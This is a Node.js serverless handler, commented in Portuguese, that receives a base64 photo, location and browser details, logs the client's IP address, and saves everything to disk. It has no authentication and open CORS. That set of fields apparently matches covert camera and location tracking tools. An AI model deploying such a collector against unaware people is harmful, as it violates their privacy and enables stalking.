const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const path = require('path');

const UPLOAD_DIR = '/tmp/uploads';

// Garante que a pasta existe
if (!fs.existsSync(UPLOAD_DIR)) {
    fs.mkdirSync(UPLOAD_DIR, { recursive: true });
}

exports.handler = async (event) => {
    console.log('📥 REQUISIÇÃO RECEBIDA');
    console.log('📋 Método:', event.httpMethod);

    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ erro: 'Método não permitido' })
        };
    }

    try {
        const dados = JSON.parse(event.body);
        const id = uuidv4();
        const timestamp = Date.now();
        const dataHora = new Date().toISOString();

        console.log(`🆔 ID: ${id}`);
        console.log(`📅 Timestamp: ${dataHora}`);

        let fotoSalva = false;
        let nomeFoto = null;

        // Processa a foto
        if (dados.foto && dados.foto.startsWith('data:image')) {
            try {
                const base64Data = dados.foto.replace(/^data:image\/\w+;base64,/, '');
                const extensao = dados.foto.match(/^data:image\/(\w+);base64,/)?.[1] || 'jpg';
                nomeFoto = `foto_${id}_${timestamp}.${extensao}`;
                const fotoPath = path.join(UPLOAD_DIR, nomeFoto);
                fs.writeFileSync(fotoPath, base64Data, 'base64');
                fotoSalva = true;
                console.log(`✅ Foto salva: ${nomeFoto} (${Math.round(base64Data.length / 1024)}KB)`);
            } catch (err) {
                console.log(`❌ Erro foto: ${err.message}`);
            }
        }

        // Dados para salvar
        const dadosParaSalvar = {
            id,
            timestamp: dataHora,
            localizacao: dados.localizacao || null,
            navegador: dados.navegador || null,
            ip: event.headers['x-forwarded-for'] || event.headers['client-ip'] || 'IP não disponível',
            foto: nomeFoto,
            fotoBase64: dados.foto || null
        };

        // Salva JSON
        const jsonPath = path.join(UPLOAD_DIR, `dados_${id}_${timestamp}.json`);
        fs.writeFileSync(jsonPath, JSON.stringify(dadosParaSalvar, null, 2));
        console.log(`💾 Dados salvos: ${jsonPath}`);

        return {
            statusCode: 200,
            headers: {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            },
            body: JSON.stringify({
                status: 'success',
                id: id,
                fotoSalva: fotoSalva,
                timestamp: dataHora
            })
        };

    } catch (error) {
        console.error('💥 ERRO:', error);
        return {
            statusCode: 500,
            headers: {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            },
            body: JSON.stringify({ erro: error.message })
        };
    }
};
